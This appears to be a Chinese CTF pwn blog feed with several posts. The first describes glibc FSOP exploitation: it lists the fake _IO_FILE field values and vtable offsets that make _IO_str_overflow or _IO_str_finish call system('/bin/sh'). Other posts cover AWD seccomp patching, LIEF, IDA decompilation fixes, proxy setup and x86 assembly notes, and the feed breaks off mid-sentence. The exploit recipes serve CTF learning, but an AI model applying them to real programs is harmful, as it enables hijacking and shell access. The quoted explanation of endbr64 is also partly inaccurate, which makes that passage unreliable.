class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_blen(fp)宏</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><h3 id="0x1-1"><a href="#0x1-1" class="headerlink" title="0x1"></a>0x1</h3><p>利用的是其中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>要满足的条件</p><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li><li>fp+0xe0指向system地址</li></ol><p>绕过</p><ol><li>fp-&gt;<em>flags = 0</em></li><li>_fp-&gt;_IO_buf_base = 0</li><li>fp-&gt;<em>IO_buf_end = (bin_sh_addr - 100) / 2</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li><li>vtable = _IO_str_jumps - 0x18</li></ol><p>或者</p><ol><li>_flags = 0 </li><li>_IO_write_base = 0 </li><li>_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 </li><li>_IO_buf_end = (binsh_in_libc_addr -100) / 2  </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_jumps - 0x18</li></ol><h3 id="0x2-1"><a href="#0x2-1" class="headerlink" title="0x2"></a>0x2</h3><p>注意到满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br></pre></td></tr></table></figure><p>的时候，会先后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size_t old_blen = _IO_blen (fp);</span><br><span class="line">// #define _IO_blen (fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br><span class="line">new_buf = malloc (new_size);</span><br><span class="line">memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">free (old_buf);</span><br></pre></td></tr></table></figure><p>三个操作，伪造 _IO_FILE 并劫持 vtable 为 _IO_str_jumps 通过一个 large bin attack 就可以轻松实现，并且上面三个语句中的 new_size，old_buf 和 old_blen 是我们可控的，这个函数就可以实现以下三步</p><ol><li>调用 malloc，实现从 tcache 中分配 chunk，在这里就可以把我们之前放入的 __free_hook fake chunk 申请出来</li><li>将一段可控长度可控内容的内存段拷贝置 malloc 得来的 chunk 中（可以修改 __free_hook 为 system）</li><li>调用 free，且参数为内存段起始地址（”/bin/sh\x00”，getshell）</li></ol><p>只要构造得当，执行该函数即可 getshell。</p><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//call qword ptr [fp+0E8h]参数为fp-&gt;_IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件：</p><ol><li>_IO_buf_base 不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造如下：</p><ol><li>_flags = (binsh_in_libc + 0x10) &amp; ~1 </li><li>_IO_buf_base = binsh_addr </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_finish - 0x18 </li><li>fp+0xe8 -&gt; system_addr</li></ol><p>或者</p><ol><li>fp-&gt;<em>flags = 0</em></li><li><em>vtable = _IO_str_jumps - 0x8//这样调用_IO_overflow时会调用到 _IO_str_finish</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
            <tag> FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awd-awdp笔记</title>
      <link href="/posts/32516/"/>
      <url>/posts/32516/</url>
      
        <content type="html"><![CDATA[<h1 id="关于awd-amp-awdp"><a href="#关于awd-amp-awdp" class="headerlink" title="关于awd&amp;awdp"></a>关于awd&amp;awdp</h1><p>目前只参加过一场awdp,想过去二者差距应该不会太大</p><p>其各自又分为check和attack,后者就是平常的做题</p><p>而要想快速高效的得分主要是靠check</p><p>不同比赛check机制可能会有些许不同,但有一些较为通用的方式</p><h1 id="0x1通防-seccomp"><a href="#0x1通防-seccomp" class="headerlink" title="0x1通防-seccomp"></a>0x1通防-seccomp</h1><p>总体思路是在不影响程序本身运行的前提下手动给程序禁用一些系统调用</p><p>推荐工具 <strong>↓</strong></p><h2 id="evilPatcher"><a href="#evilPatcher" class="headerlink" title="evilPatcher"></a>evilPatcher</h2><p>其是一个python2脚本</p><p>特点:</p><ul><li>修改的字节数少，0x100字节以下</li><li>不修改文件头信息</li><li>沙箱规则可以自己定义</li><li>支持i386和amd64</li><li>支持pie开启和未开启情况</li></ul><p><strong>其sandboxs文件夹中存储沙盒规则</strong></p><p>用法</p><p><code>python2 evilPatcher.py elfFile sandboxFile-path</code></p><p><code>python2 evilPatcher.py elfFile sandboxFile-path 1</code>会有详细中间过程</p><p>已自动识别32位和64位与pie</p><p> 结果输出一个patch过后的文件，文件名为原来文件加上.patch后缀</p><p><a href="https://github.com/TTY-flag/evilPatcher">github项目地址</a></p><h1 id="0x2LIEF"><a href="#0x2LIEF" class="headerlink" title="0x2LIEF"></a>0x2LIEF</h1><p><code>LIEF</code>是一个能够用于对各种类型的可执行文件（包括Linux ELF文件、Windows exe文件、Android Dex文件等）进行转换、提取、修改的项目，能够在Python、C++和C语言中调用其API进行简单便捷的可执行文件相关操作。</p><p>当不能简单地通过在IDA中修改指令的方式patch时，就需要使用LIEF工具完成patch。</p><p>一般使用其python包</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="程序加载重建"><a href="#程序加载重建" class="headerlink" title="程序加载重建"></a>程序加载重建</h3><p>调用lief.ELF.parse() 函数加载一个可执行文件。如果输入的文件为ELF文件，则返回一个lief.ELF.Binary对象。</p><p>例<code>binary=lief.ELF.parse(&#39;./elf&#39;)</code></p><p>重建这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binary.write(&quot;elf.modified&quot;)</span><br></pre></td></tr></table></figure><h3 id="header字段"><a href="#header字段" class="headerlink" title="header字段"></a>header字段</h3><p>elf的header字段保存有该ELF文件的一些相关信息，</p><p>包括程序的入口地址（binary.header.entrypoint）、程序运行的机器类型（binary.header.machine_type），</p><p>这两个值都是可以直接修改的</p><p>通过对lief项目的python源码进行查看可知header中还保存有以下较为重要的ELF文件的属性</p><p><strong>完整在lief/ELF/Header.py中查看</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_type：文件类型，表示该文件是一个可执行文件还是库文件还是其他文件。</span><br><span class="line">header_size：ELF文件头部的长度。</span><br><span class="line">identity：ELF的前几个字节的值，用于标识ELF类型。</span><br><span class="line">identity_class：ELF程序的类型。</span><br><span class="line">identity_data：数据表示方式（大端序或小端序）</span><br><span class="line">numberof_sections：section（节）的数量</span><br><span class="line">numberof_segments：segment（段）的数量（一个segment中包含至少一个section）</span><br></pre></td></tr></table></figure><h3 id="其他字段"><a href="#其他字段" class="headerlink" title="其他字段"></a>其他字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dtor_functions：析构函数列表。</span><br><span class="line">functions：函数列表。</span><br><span class="line">imagebase：ELF文件的加载基地址，在64位程序下，不开启PIE时Image Base=0x401000，开启后在程序开始执行前动态加载，地址不定。</span><br><span class="line">is_pie：是否开启了PIE。</span><br><span class="line">sections：节列表，迭代器。</span><br><span class="line">segments：段列表，迭代器。</span><br><span class="line">static_symbols：静态符号列表，迭代器。</span><br><span class="line">strings：字符串列表，迭代器。</span><br><span class="line">symbols：所有符号的列表，迭代器。</span><br><span class="line">imported_functions：导入函数列表，即got表中的函数列表。</span><br></pre></td></tr></table></figure><p>可以直接binary.is_pie这样调用</p><h3 id="修改ELF的symbols"><a href="#修改ELF的symbols" class="headerlink" title="修改ELF的symbols"></a>修改ELF的symbols</h3><h3 id="ELF-Hooking"><a href="#ELF-Hooking" class="headerlink" title="ELF Hooking"></a>ELF Hooking</h3><h3 id="修改got表"><a href="#修改got表" class="headerlink" title="修改got表"></a>修改got表</h3><h1 id="0x3-angr"><a href="#0x3-angr" class="headerlink" title="0x3 angr"></a>0x3 angr</h1>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awd </tag>
            
            <tag> awdp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ida伪代码生成失败应对</title>
      <link href="/posts/35200/"/>
      <url>/posts/35200/</url>
      
        <content type="html"><![CDATA[<h1 id="ida反编译失败应对"><a href="#ida反编译失败应对" class="headerlink" title="ida反编译失败应对"></a>ida反编译失败应对</h1><span class='p red h3'>基本都是堆栈不平衡引起的</span><p>在IDA Pro中,如果返回之前没有清理堆栈分配(平衡堆栈指针)，则反编译器将拒绝反编译该函数.</p><p>参考<a href="https://www.freebuf.com/sectool/156625.html">慎点！来自反编译器的危险 - FreeBuf网络安全行业门户</a></p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>程序存在一些故意干扰指令</p><p>比如用push(call 本函数内部) + n条指令 + <strong>retn</strong>来实际跳转，而IDA会将这个<strong>retn</strong>认为是整个函数结束</p><p>结果分析后发现调用栈不平衡，因此就提示sp analysis failed.</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>分析干扰指令,并优化</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p><strong>2023ciscn华东南—colorful</strong></p><p>直接反编译main</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_162711.png" alt=""></p><p><strong>提示我们问题出在1d87处</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_162837.png" alt=""></p><p>标黄的retn被认为是main的结束,但显然不是,因此栈不平衡</p><p>且retn上面的部分都是干扰指令</p><p>那么就要想办法优化这部分指令</p><p>先分析干扰指令</p><ol><li>call loc_1D8F:push rip<strong>(1D8C)</strong>,jmp loc_1D8F</li><li>pop rax:将rax变为1D8C,再跳转</li><li>inc rax:rax加1,成为1D8D,再跳转</li><li>push rax; retn:将rax压入栈,并以此为返回地址</li><li>1D8D处的指令为E8 0D,即<u><strong>jmp 1d8c+D(即1d9c)</strong></u></li></ol><p>可以看到这部分代码没有实现任何功能,完全就是干扰</p><p>完全可以优化</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-06-26_164306.png" alt=""></p><p><strong>在1d87处直接跳转到1d9c,其余代码全部nop</strong></p><p>之后即可得到伪代码</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>发现干扰指令并优化,去除提前出现的retn等会让ida误解的指令</p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><h3 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h3><p>修正sp值</p><p>保持call或jmp等跳转指令<strong>前后栈平衡</strong></p><p>call或jmp等跳转指令前的sp是多少,那么紧接在该指令后的sp也修改为多少</p><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><h3 id="解决-2"><a href="#解决-2" class="headerlink" title="解决"></a>解决</h3><p>选中红色代码部分,快捷键p创建函数,该部分即可得到伪代码</p><p>但前面的部分依然不行</p><p>再调整函数开始的sp尝试</p><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><h3 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">one_function</span><span class="params">( <span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">another_function</span><span class="params">( <span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( a == <span class="number">0</span> || b == <span class="number">0</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> one_function(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中return one_function(a,b)这条语句，在某些新的编译器，可能会编译成这样的指令序列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">jmp one_funcion</span><br></pre></td></tr></table></figure><p>而IDA是通过retn指令来识别函数的结束的，因为它不知道这里的意思，会把它当成一个函数内部 的跳转，最后就会出现sp analysis failed了。</p><h3 id="解决-3"><a href="#解决-3" class="headerlink" title="解决"></a>解决</h3><p>调整指令</p><h1 id="ida调试elf"><a href="#ida调试elf" class="headerlink" title="ida调试elf"></a>ida调试elf</h1><h1 id="关于ubuntu中使用clash"><a href="#关于ubuntu中使用clash" class="headerlink" title="关于ubuntu中使用clash"></a>关于ubuntu中使用clash</h1><h2 id="0x1-clash设置"><a href="#0x1-clash设置" class="headerlink" title="0x1 clash设置"></a>0x1 clash设置</h2><p>首先clash开启允许局域网连接,并记住端口一般是7890</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-23_163701.png" alt=""></p><h2 id="0x2-设置网络"><a href="#0x2-设置网络" class="headerlink" title="0x2 设置网络"></a>0x2 设置网络</h2><p>在网络的属性-&gt;共享中设置网络</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-23_163832.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-23_163931.png" alt=""></p><h2 id="0x3-查看vmnet8的ip"><a href="#0x3-查看vmnet8的ip" class="headerlink" title="0x3 查看vmnet8的ip"></a>0x3 查看vmnet8的ip</h2><p>cmd窗口输入ipconfig获得vmnet8的ipv4地址</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-23_164016.png" alt=""></p><h2 id="0x4-虚拟机代理设置"><a href="#0x4-虚拟机代理设置" class="headerlink" title="0x4 虚拟机代理设置"></a>0x4 虚拟机代理设置</h2><p>虚拟机设置-&gt;网络-&gt;代理,设置为手动并填充之前的信息</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-11-23_164201.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode及一些汇编</title>
      <link href="/posts/30663/"/>
      <url>/posts/30663/</url>
      
        <content type="html"><![CDATA[<h1 id="基础汇编"><a href="#基础汇编" class="headerlink" title="基础汇编"></a>基础汇编</h1><h2 id="syscall-int-0x80"><a href="#syscall-int-0x80" class="headerlink" title="syscall(~int 0x80)"></a>syscall(~int 0x80)</h2><div class="table-container"><table><thead><tr><th>function</th><th>syscall number x86_32</th><th>syscall number x86_64</th></tr></thead><tbody><tr><td>read</td><td>3</td><td>0</td></tr><tr><td>write</td><td>4</td><td>1</td></tr><tr><td>open</td><td>5</td><td>2</td></tr><tr><td>execve</td><td>11</td><td>59</td></tr></tbody></table></div><h2 id="汇编长度判断"><a href="#汇编长度判断" class="headerlink" title="汇编长度判断"></a>汇编长度判断</h2><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><h4 id="双寄存器"><a href="#双寄存器" class="headerlink" title="双寄存器"></a>双寄存器</h4><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>mov r64,r64</td><td>3</td></tr><tr><td>mov e32,e32</td><td>2</td></tr><tr><td>mov 16,16</td><td>3</td></tr></tbody></table></div><h4 id="单寄存器"><a href="#单寄存器" class="headerlink" title="单寄存器"></a>单寄存器</h4><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>mov  r64,int32</td><td>7</td></tr><tr><td>mov r64,int64</td><td>10</td></tr><tr><td>mov r64,[r64]/mov [r64],r64</td><td>3~4</td></tr><tr><td>mov r64,[r64+0x??]/mov [r64+0x??],r64</td><td>在上基础根据??判断增加</td></tr><tr><td>mov e32,int32</td><td>5</td></tr><tr><td>mov e32,[e32]/mov [e32],e32</td><td>2~3</td></tr><tr><td>mov e32,[e32+0x??]/mov [e32+0x??],e32</td><td>在上基础根据??判断增加</td></tr></tbody></table></div><p><strong>在上基础根据??判断增加</strong>:增加规则,2个十六进制数及以下+1字节;3到8个十六进制数+4字节,再往上+8字节</p><h3 id="push-amp-pop"><a href="#push-amp-pop" class="headerlink" title="push&amp;pop"></a>push&amp;pop</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>push int8</td><td>2</td></tr><tr><td>push int32/int64</td><td>5</td></tr><tr><td>push r64/e32</td><td>1</td></tr><tr><td>pop r64/e32</td><td>1</td></tr><tr><td>pop [r64]</td><td>2~3</td></tr><tr><td>pop [r64+0x??]</td><td>在上基础根据??判断增加</td></tr></tbody></table></div><h3 id="and-amp-or-amp-xor"><a href="#and-amp-or-amp-xor" class="headerlink" title="and&amp;or&amp;xor"></a>and&amp;or&amp;xor</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>and/or r64,r64</td><td>3</td></tr><tr><td>and/or/xor r64,int8/int32/int64</td><td>4/6/10?</td></tr><tr><td>and/or e32,e32</td><td>2</td></tr><tr><td>and/or/xor r64,int8/int32/int64</td><td>3/6/10?</td></tr></tbody></table></div><h3 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h3><div class="table-container"><table><thead><tr><th>指令</th><th>长度(bytes)</th></tr></thead><tbody><tr><td>jmp r64(绝对跳转)</td><td>2</td></tr><tr><td>jmp $+0x??(相对跳转)</td><td>视??决定,&gt;=2</td></tr></tbody></table></div><h2 id="指令相关"><a href="#指令相关" class="headerlink" title="指令相关"></a>指令相关</h2><h3 id="movabs"><a href="#movabs" class="headerlink" title="movabs"></a>movabs</h3><p>在x86-64架构下想要加载一个64位的立即数，应该使用 movabs 指令，而不是 mov 指令，以确保立即数被正确加载到64位寄存器中。</p><p>当将64位的立即数赋值给寄存器时</p><p>应该这样写<code>movabs &lt;寄存器&gt;, &lt;立即数&gt;</code></p><p>不过写mov影响也不大,因为编译后会自动处理为movabs</p><h3 id="movzx-amp-movsx"><a href="#movzx-amp-movsx" class="headerlink" title="movzx&amp;movsx"></a>movzx&amp;movsx</h3><p><code>movzx</code>用于将一个较小的无符号数（通常是8位或16位）从一个寄存器复制到另一个较大的寄存器，并在高位补零。</p><p>这个指令通常用于将无符号数扩展到较大的寄存器中，以便进行后续的运算，避免出现符号位扩展的问题。</p><p>例如，x86 架构中的 <code>movzx</code> 可以这样使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assemblyCopy code</span><br><span class="line">movzx eax, byte ptr [ebx]</span><br></pre></td></tr></table></figure><p>这条指令会将存储在 <code>ebx</code> 寄存器指向的内存地址中的一个8位无符号数值复制到 <code>eax</code> 寄存器，并将 <code>eax</code> 的高位补零，将其扩展为32位。这样，<code>eax</code> 中的值将是一个无符号的32位整数。</p><p><code>movsx</code>是<code>movsx</code>的有符号对应指令</p><h3 id="cdqe-amp-cdq"><a href="#cdqe-amp-cdq" class="headerlink" title="cdqe&amp;cdq"></a>cdqe&amp;cdq</h3><p><code>cdqe</code> 和 <code>cdq</code> 是x86-64架构（amd64）中的指令，用于对寄存器进行符号扩展，特别是在从32位寄存器到64位寄存器的数据传送中。</p><ol><li><p><strong><code>cdqe</code> 指令</strong>：</p><ul><li><code>cdqe</code> 用于从32位寄存器 <code>eax</code> 扩展到64位寄存器 <code>rax</code>。它执行符号扩展，即将 <code>eax</code> 的符号位（即最高位）复制到 <code>rax</code> 的高位，使得 <code>rax</code> 的高32位与 <code>eax</code> 的值保持一致。</li><li>在32位代码中，通常使用 <code>cdqe</code> 来将有符号的32位整数符号扩展为64位整数，以便继续在64位寄存器中进行操作。</li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, -123   ; 将一个有符号的32位整数 -123 赋值给 eax</span><br><span class="line">cdqe            ; 将 eax 符号扩展到 rax，此时 rax 的值为 (0xFFFFFFFFFFFFFF85）</span><br></pre></td></tr></table></figure></li><li><p><strong><code>cdq</code> 指令</strong>：</p><ul><li><code>cdq</code> 用于从32位寄存器 <code>eax</code> 扩展到64位寄存器组合 <code>edx:eax</code>。它执行符号扩展，即将 <code>eax</code> 的符号位（即最高位）复制到 <code>edx</code> 的所有位，使得 <code>edx</code> 全部填充为 <code>eax</code> 的符号位。</li><li>在32位代码中，通常使用 <code>cdq</code> 来将有符号的32位整数符号扩展为64位整数的组合（即<code>edx:eax</code>），以便进行64位整数运算。</li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, -123   ; 将一个有符号的32位整数 -123 赋值给 eax</span><br><span class="line">cdq             ; 将 eax 符号扩展到 edx:eax，此时 edx 的值全部为 0xFFFFFFF（-1）</span><br></pre></td></tr></table></figure></li></ol><h3 id="bnd"><a href="#bnd" class="headerlink" title="bnd"></a>bnd</h3><p>在汇编中,经常能看到jmp指令前有一个bnd标识符</p><p>在汇编语言中，<code>bnd</code> 指令通常用于设置边界检查，以确保内存访问不会超出指定的边界。<code>bnd</code> 指令通常与条件跳转指令（如 <code>jmp</code>）一起使用，以实现在特定条件下跳转到目标地址。</p><p>具体来说，<code>bnd</code> 指令可以用来设置内存操作的边界检查条件。如果边界检查条件失败，那么跳转指令（如 <code>jmp</code>）可能不会执行跳转，从而防止越界访问。</p><h3 id="endbr32-amp-amp-endbr64"><a href="#endbr32-amp-amp-endbr64" class="headerlink" title="endbr32&amp;&amp;endbr64"></a>endbr32&amp;&amp;endbr64</h3><p>参考文章<a href="https://cs.pynote.net/hd/asm/202302172/">endbr64指令（x64） | CS笔记 (pynote.net)</a></p><p>在代码段的开头有一条指令出现频率非常高,就是endbr64</p><p>该指令是Intel CET（Control flow Enforcement Technology）技术的一部分</p><blockquote><p>Intel CET offers hardware protection against Return-oriented Programming (ROP) and Jump/Call-oriented Programming (JOP/COP) attacks, which manipulate control flow in order to <code>re-use existing code for malicious purposes</code>.</p><p>Its two major features are:</p><ul><li>a <strong>shadow stack</strong> for tracking return addresses and</li><li><strong>indirect branch tracking</strong>, which <strong>endbr64</strong> is a part of.</li></ul><p>The opcode is chosen to be a NOP on older processors, such that the instruction is ignored if CET is not supported, the same happens on CET-capable processors where indirect branch tracking is disabled.</p><p><strong>So what does endbr64 do?</strong></p><p>Preconditions:</p><ul><li>CET must be enabled by setting the control register flag CR4.CET to 1.</li><li>The appropriate flags for indirect branch tracking in the IA32_U_CET (user mode) or IA32_S_CET (supervisor mode) MSRs are set.</li></ul></blockquote><hr><blockquote><p>how endbr64 works?</p><p>endbr64 is an x86-64 instruction that is used as part of Control Flow Enforcement Technology (CET), which is a security feature designed to mitigate certain types of attacks such as Return Oriented Programming (ROP) and Jump Oriented Programming (JOP).</p><p>The basic idea behind CET is to create shadow stacks that keep track of the call site addresses using a separate stack from the regular call stack. This can help detect when an attacker tries to redirect program execution by overwriting the return address on the regular call stack.</p><p>However, there is still a vulnerability in this approach: an attacker could potentially use gadgets that don’t include a ret instruction at the end, preventing the shadow stack from being updated properly. In other words, an attacker could subvert the control-flow enforcement mechanism by using a gadget to jump directly to another gadget without actually returning to the original code.</p><p>This is where endbr64 comes in. It is used to mark the end of a branch instruction sequence (such as a jmp or call) and ensures that the shadow stack is updated even if the branch doesn’t end with a ret. The endbr64 instruction is placed immediately after the branch instruction and signals to the processor that the branch has ended and that the shadow stack should be updated accordingly.</p><p>In summary, endbr64 is a security feature designed to complement Control Flow Enforcement Technology (CET) by ensuring that the shadow stack is correctly updated even in the presence of branches that do not end with a ret instruction. This helps to prevent attacks such as ROP and JOP that attempt to hijack program execution by manipulating the control flow of the program.</p></blockquote><p>CET 通过编译器在合理的间接跳转 <strong>(call/jmp)</strong> 中用新的指令做标记，新指令包含 endbr32 和 endbr64。程序每次执行跳转时，CPU 都会判断下一条指令是不是 endbr32/endbr64 指令，如果是则正常执行，如果不是，则会触发 #CP 异常。</p><h3 id="repz-ret"><a href="#repz-ret" class="headerlink" title="repz ret"></a>repz ret</h3><p>指令组合 rep;ret 在反汇编中对应于 repz；retq，分别对应同义名。在指导建议书中建议 ret 前增加rep 的组合来避免使 ret 指令成为条件跳转指令的目标。根据 AMD 的说法，当通过跳转指令跳转到ret 指令时，处理器不能正确预测 ret 指令的目的。这里的 rep 指令就是一种<strong>空操作</strong>，因此作为跳转目的插入它，除了能使代码在 AMD 上运行的更快，同时不会改变代码的其他行为。</p><h3 id="seta-amp-setb"><a href="#seta-amp-setb" class="headerlink" title="seta&amp;setb"></a>seta&amp;setb</h3><p>设置al,bl用的指令</p><h3 id="test-amp-cmp"><a href="#test-amp-cmp" class="headerlink" title="test&amp;cmp"></a>test&amp;cmp</h3><p><code>test ax,bx</code>相当于<code>and ax,bx</code></p><p><code>cmp ax,bx</code>相当于<code>sub ax,bx</code></p><p>不过它们根据计算的结果调整flag标志位,并不保存计算结果</p><h3 id="ror-amp-amp-rol"><a href="#ror-amp-amp-rol" class="headerlink" title="ror&amp;&amp;rol"></a>ror&amp;&amp;rol</h3><p>在汇编语言中，<code>ror</code> 是“循环右移”（Rotate Right）的缩写。<code>ror</code> 指令将二进制数据按位向右循环移动，被移出的位会重新出现在最左侧。这个操作通常用于对二进制数据进行循环移位，比如在加密算法、校验和计算等方面。</p><p>与之相对应的还有<code>rol</code>,左循环移位</p><h3 id="retfq"><a href="#retfq" class="headerlink" title="retfq"></a>retfq</h3><p>程序运行时判别是<code>64</code>位还是<code>32</code>位，主要靠<code>cs</code>寄存器</p><p>而<code>retfq</code>就相当于<code>pop ip; pop cs</code>，</p><p>其中<code>cs</code>为<code>0x23</code>代表<code>32</code>位，为<code>0x33</code>代表<code>64</code>位</p><p>还有需要注意的是，在<code>64</code>位切换到<code>32</code>位时，地址解析的规则也会变为<code>32</code>位的，因此栈帧会发生改变，如原先的<code>rsp = 0x7fff23333333</code>会被解析成<code>esp = 